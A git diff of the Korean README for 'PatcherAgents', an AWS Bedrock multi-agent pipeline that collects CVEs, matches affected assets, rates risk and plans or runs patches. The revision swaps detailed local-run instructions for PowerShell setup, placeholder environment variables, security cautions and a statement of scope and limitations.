-- `patch_exec_only`
-  patch execution runtime만 호출
-
-### `.env` 탐색 방식
-
-실행기는 아래 순서로 `.env`를 찾습니다.
-
-1. `MultiAIagent/.env`
-2. `PacherAgents/.env`
-
-즉 `MultiAIagent` 폴더 안에 `.env`가 있으면 그걸 우선 사용하고, 없으면 상위 루트 `.env`를 사용합니다.
-
-### 필요한 로컬 환경
-
-최소 기준:
-
-- Python 3.13 권장
-- `boto3`
-- `python-dotenv`
-
-처음 세팅 예시는 아래 정도면 충분합니다.
-
-```bash
-cd /Users/jms/Desktop/project/PacherAgents
-python3 -m venv .venv
-source .venv/bin/activate
-pip install --upgrade pip
-pip install boto3 python-dotenv
+```powershell
+python -m venv .venv
+.\.venv\Scripts\Activate.ps1
 ```
 
-### 필요한 `.env`
-
-로컬 실행기와 각 runtime 호출 기준으로 아래 값들을 준비하는 것이 좋습니다.
-
-필수:
-
-```env
-AWS_ACCESS_KEY_ID=...
-AWS_SECRET_ACCESS_KEY=...
-AWS_DEFAULT_REGION=ap-northeast-2
-
-ORCHESTRATOR_AGENTCORE_ARN=arn:aws:bedrock-agentcore:ap-northeast-2:...:runtime/orchestrator_agent-...
-INFRA_MATCHING_AGENTCORE_ARN=arn:aws:bedrock-agentcore:ap-northeast-2:...:runtime/asset_matching_agent-...
-VULN_COLLECTOR_AGENTCORE_ARN=arn:aws:bedrock-agentcore:ap-northeast-2:...:runtime/vuln_collector_agent-...
-RISK_EVAL_AGENTCORE_ARN=arn:aws:bedrock-agentcore:ap-northeast-2:...:runtime/risk_evaluation_agent-...
-PATCH_IMPACT_AGENTCORE_ARN=arn:aws:bedrock-agentcore:ap-northeast-2:...:runtime/patch_impact_container-...
-PATCH_EXECUTION_AGENTCORE_ARN=arn:aws:bedrock-agentcore:ap-northeast-2:...:runtime/patch_exec_agent-...
-```
-
-선택:
-
-```env
-BEDROCK_MODEL_ID=global.anthropic.claude-haiku-4-5-20251001-v1:0
-PATCH_IMPACT_BEDROCK_MODEL=global.anthropic.claude-haiku-4-5-20251001-v1:0
-
-PATCH_MAX_FOLLOWUPS_PER_RECORD=8
-PATCH_MAX_RECORD_WALL_TIME_SECONDS=240
-PATCH_MAX_TOTAL_WALL_TIME_SECONDS=900
-```
-
-참고:
-
-- `PATCH_EXECUTION_ARN`은 `PATCH_EXECUTION_AGENTCORE_ARN`의 alias로도 읽습니다.
-- `BEDROCK_MODEL_ID`는 공통 기본값이고, `PATCH_IMPACT_BEDROCK_MODEL`이 있으면 patch runtime에서 우선 사용합니다.
-- patch 질문 제한은 기본값이 이미 들어 있으므로 필요할 때만 override 하면 됩니다.
-
-### 실행 명령
+각 에이전트 디렉터리의 `requirements.txt`를 기준으로 필요한 패키지를 설치합니다.
 
 예시:
 
-```bash
-"/Users/jms/Desktop/project/PacherAgents/.venv/bin/python3" \
-  "/Users/jms/Desktop/project/PacherAgents/MultiAIagent/run_orchestrator_runtime.py"
+```powershell
+python -m pip install -r "MultiAIagent/VulnCollectorAgent(AWS)/requirements.txt"
+python -m pip install -r "MultiAIagent/Infra_matchingAgent(AWS)/requirements.txt"
+python -m pip install -r "MultiAIagent/Risk_evaluation_agent(AWS)/requirements.txt"
+python -m pip install -r "MultiAIagent/PatchStrategyAgent(AWS)/requirements.txt"
+python -m pip install -r "MultiAIagent/PatchExecAgent(AWS)/requirements.txt"
 ```
 
-### 사용 방법
+### Frontend
 
-실행 후 기본 규칙은 간단합니다.
+```powershell
+cd frontend
+pnpm install
+pnpm dev
+```
 
-- 대괄호 `[ ]` 안의 값은 기본값
-- 기본값 그대로 쓰려면 엔터
-- JSON 파일 경로도 기본 후보가 뜨면 엔터
-
-실행기 안에서 고를 수 있는 모드는 아래입니다.
-
-1. `full`
-2. `vuln_only`
-3. `asset_only`
-4. `risk_only`
-5. `patch_only`
-6. `patch_exec_only`
-7. `test`
-
-### 모드별 입력
-
-#### `full`
-
-보통 추가 파일 입력 없이 시작합니다.
-앞 단계 결과를 동적으로 이어받아 다음 단계로 넘깁니다.
-
-#### `vuln_only`
-
-별도 JSON 입력 없이 실행 가능
-
-#### `asset_only`
-
-필요 입력:
-
-- `asset_matching_payload.json`
-
-#### `risk_only`
-
-필요 입력:
-
-- `infra_context.json`
-- `risk_assessment_payloads.json`
-
-#### `patch_only`
-
-필요 입력:
-
-- `infra_context.json`
-- `risk_evaluation_result.json`
-- `operational_impact_payloads.json`
-
-참고:
-
-- patch는 더 이상 `pre/followup/final` 외부 단계를 나누지 않습니다.
-- `patch_impact_agent`가 위 3개 입력을 한 번에 읽고, 부족한 direct technical fact만 asset agent에 직접 질문합니다.
-- 최종 산출물은 `patch_strategy_result.json` 하나를 기준으로 보면 됩니다.
-
-#### `patch_exec_only`
-
-필요 입력:
-
-- `patch_strategy_result.json`
-
-#### `test`
-
-특정 단계까지만 확인할 때 씁니다.
-
-예:
-
-- `stop_stage = patch`
-  patch 단계까지 확인
-- `stop_stage = patch_execution`
-  patch execution 단계까지 확인
-
-중요:
-
-- `test_inputs`로 직접 넣은 값은 우선 사용
-- 부족한 값은 필요한 앞단 결과로 보충
-
-## 결과 저장 위치
-
-실행 결과는 기본적으로 `MultiAIagent/OchestraResult` 아래에 저장됩니다.
-
-구조:
+기본 개발 서버:
 
 ```text
-OchestraResult/
-├── orchestrator_agent/latest/
-├── vuln_collector_agent/latest/
-├── asset_matching_agent/latest/
-├── risk_evaluation_agent/latest/
-├── patch_impact_agent/latest/
-└── patch_execution_agent/latest/
+http://localhost:5173
 ```
 
-원칙:
+### Orchestrator
 
-- `latest/`: 가장 최근 결과
-- `<run_tag>/`: 실행 단위 보관본
+저장소 루트에서 실행합니다.
 
-중요:
+```powershell
+python MultiAIagent/run_orchestrator_runtime.py
+```
 
-- 현재 patch 단계에서 사람이 최종 판단을 볼 때는 `patch_strategy_result.json` 하나를 보면 됩니다.
-- `patch_strategy_context`나 `asset_fact_trace`는 디버그 용도이며, 결과 해석의 1차 기준은 아닙니다.
+실제 실행에는 AWS 인증정보, Bedrock 모델 접근 권한 및 각 AgentCore Runtime ARN이 필요합니다.
 
-## `Conversationlog/PatchToAsset`
+---
 
-경로:
+## 환경변수
 
-- `MultiAIagent/Conversationlog/PatchToAsset`
+환경별 실제 값은 프로젝트 루트의 `.env`에서 관리합니다.
 
-이 폴더는 patch -> asset direct fact 대화 로그 저장소입니다.
+```env
+AWS_DEFAULT_REGION=<AWS_REGION>
+BEDROCK_MODEL_ID=<BEDROCK_MODEL_ID>
 
-생성 조건:
+ORCHESTRATOR_AGENTCORE_ARN=arn:aws:bedrock-agentcore:<AWS_REGION>:<AWS_ACCOUNT_ID>:runtime/<ORCHESTRATOR_AGENT_ID>
+ASSET_MATCHING_AGENTCORE_ARN=arn:aws:bedrock-agentcore:<AWS_REGION>:<AWS_ACCOUNT_ID>:runtime/<ASSET_MATCHING_AGENT_ID>
+RISK_EVALUATION_AGENTCORE_ARN=arn:aws:bedrock-agentcore:<AWS_REGION>:<AWS_ACCOUNT_ID>:runtime/<RISK_EVALUATION_AGENT_ID>
+PATCH_STRATEGY_AGENTCORE_ARN=arn:aws:bedrock-agentcore:<AWS_REGION>:<AWS_ACCOUNT_ID>:runtime/<PATCH_STRATEGY_AGENT_ID>
+PATCH_EXEC_AGENTCORE_ARN=arn:aws:bedrock-agentcore:<AWS_REGION>:<AWS_ACCOUNT_ID>:runtime/<PATCH_EXEC_AGENT_ID>
 
-- `patch_only` 또는 `full` 실행 중
-- patch planner가 어떤 필드를 채우기에 근거가 부족하다고 판단해 asset에 직접 질문한 경우
+OPENCVE_API_KEY=<OPENCVE_API_KEY>
+```
 
-저장 구조:
+AWS CLI Profile 또는 IAM Role을 사용하는 환경에서는 Access Key를 `.env`에 직접 기록하지 않아도 됩니다.
+
+실제 `.env` 파일은 Git에 커밋하지 않습니다.
+
+---
+
+## 보안 및 운영 주의사항
+
+이 프로젝트는 보안 자동화 연구, 실습 및 데모를 목적으로 합니다.
+
+- 취약한 nginx 및 Log4j 환경은 외부 인터넷과 분리된 실습 환경에서만 운영합니다.
+- 실제 AWS 계정 ID, ARN, Instance ID, VPC ID, IP 주소를 저장소에 커밋하지 않습니다.
+- `.env`, AWS Access Key, Secret Key, Slack Token 및 Signing Secret을 Git에 저장하지 않습니다.
+- 실행 결과에는 실제 인프라 정보가 포함될 수 있으므로 `OchestraResult`와 `Conversationlog`를 Git에서 제외합니다.
+- AgentCore Runtime 호출 권한은 필요한 Runtime ARN으로 제한합니다.
+- AWS SSM 실행 권한은 허용된 대상 인스턴스로 제한합니다.
+- 모델이 생성한 명령을 검증 없이 운영 서버에서 실행하지 않습니다.
+- 실제 패치 실행 전 대상 자산, 승인 상태, Rollback 계획 및 검증 절차를 확인합니다.
+- `Exec`와 `Full` 모드는 실제 서버 변경으로 이어질 수 있으므로 격리된 환경에서만 사용합니다.
+- 실습 종료 후 생성된 AWS 리소스를 삭제하여 불필요한 비용과 노출을 방지합니다.
+
+---
+
+## 현재 범위와 한계
+
+현재 프로젝트는 다음 환경을 중심으로 구현되었습니다.
 
 ```text
-Conversationlog/PatchToAsset/
-├── latest.json
-└── <run_tag>/
-    ├── conversation_log.json
-    ├── CVE-...__i-....json
-    └── ...
+AWS 기반 3-Tier 인프라
+EC2 및 AWS Systems Manager
+nginx 1.20.0
+Log4j 2.14.1
+CVE-2021-23017
+CVE-2021-44228
 ```
 
-주요 필드 예시:
+현재 한계:
 
-- 최상위:
-  - `run_tag`
-  - `generated_at`
-  - `response_count`
-  - `conversations`
-- `conversations[]` 내부:
-  - `request_id`
-  - `cve_id`
-  - `instance_id`
-  - `source_agent`
-  - `target_agent`
-  - `transcript`
-  - `final_answer`
+- 분석 대상 취약점과 제품이 데모 시나리오 중심으로 제한되어 있습니다.
+- 자산 수집은 AWS EC2 및 SSM 기반 환경에 최적화되어 있습니다.
+- AI 판단 결과는 입력 데이터의 완전성과 자산 수집 정확도에 영향을 받습니다.
+- 패치 실행 명령에 대한 Allowlist와 정책 기반 검증을 지속적으로 강화해야 합니다.
+- 실제 운영 적용 전 변경 승인, Rollback, 감사 로그와 같은 운영 통제가 추가로 필요합니다.
 
-중요:
+확장 방향:
 
-- 지금 patch -> asset 대화는 예전처럼 `question_bundle` 중심이 아니라,
-  실제 direct fact 질문과 그 응답을 `transcript`에 남기는 구조입니다.
-- 즉 transcript를 보면 patch가 어떤 필드를 채우기 위해 어떤 direct technical question을 보냈는지 확인할 수 있습니다.
+- 다수 CVE 및 제품군 지원
+- Container 및 Kubernetes 자산 분석
+- AWS Security Hub, Inspector, Config 연동
+- 패치 명령 Allowlist 및 정책 엔진
+- 자동 Rollback과 사후 검증
+- Agent별 테스트 및 평가 체계
+- CI/CD 기반 코드 및 보안 검사
+- 실행 결과 저장소와 감사 추적 강화
 
-## 결과 해석
+---
 
-patch 최종 결론은 `patch_strategy_result.json`의 아래 필드를 우선 보면 됩니다.
+## 프로젝트 요약
 
-- `selected_action`
-- `decision`
-- `reason_summary`
+PatcherAgents는 다음 판단 과정을 자동화하는 프로젝트입니다.
 
-예:
+```text
+공개된 취약점은 무엇인가?
+        ↓
+우리 인프라에서 어떤 자산이 영향을 받는가?
+        ↓
+각 자산의 실제 위험도는 어느 정도인가?
+        ↓
+정식 패치가 가능한가?
+        ↓
+운영 영향은 무엇인가?
+        ↓
+지금 패치할 것인가, 계획 패치할 것인가,
+완화책을 먼저 적용할 것인가, 사람이 검토할 것인가?
+```
 
-- `selected_action = apply_patch_now`
-  지금 바로 정식 패치 적용
-- `selected_action = apply_patch_planned`
-  계획된 시점에 패치 적용
-- `selected_action = apply_mitigation_now`
-  지금은 임시 완화 조치 먼저 적용
-- `selected_action = human_review`
-  사람 검토 필요
+이 프로젝트의 핵심은 AI가 보안 담당자를 대신해 무조건 패치를 실행하는 것이 아닙니다.
 
-## 배포/빌드 방식
-
-### ZIP runtime
-
-- `MultiAIagent/OchestratorAgent(AWS)`
-- `MultiAIagent/VulnCollectorAgent(AWS)`
-- `MultiAIagent/Infra_matchingAgent(AWS)`
-- `MultiAIagent/Risk_evaluation_agent(AWS)`
-- `MultiAIagent/PatchExecAgent(AWS)`
-
-보통 각 폴더의 `build_package.sh`로 `dist/deployment_package.zip`을 만듭니다.
-
-### Container runtime
-
-- `MultiAIagent/PatchStrategyAgent(AWS)`
-
-이쪽은 ECR + AgentCore container runtime 기준입니다.
-
-주요 스크립트:
-
-- `build_and_push_container.sh`
-- `deploy_container_runtime.sh`
-
-## 현재 기준으로 기억하면 좋은 것
-
-- 오케스트라는 현재 얇은 순차 파이프라인입니다.
-- patch는 container runtime 기준으로 봅니다.
-- 실행은 보통 `MultiAIagent/run_orchestrator_runtime.py`로 합니다.
-- 최근 결과는 `MultiAIagent/OchestraResult`를 봅니다.
-- patch -> asset 대화는 `MultiAIagent/Conversationlog/PatchToAsset`를 봅니다.
-- patch 최종 결론은 `patch_strategy_result.json`의 `selected_action`, `decision`, `reason_summary`를 우선 보면 됩니다.
+여러 출처에서 수집한 기술적 사실을 연결하고, 자산별 위험과 운영 영향을 구조화하여 보안 담당자가 더 빠르고 근거 있게 대응할 수 있도록 지원하는 것이 목적입니다.
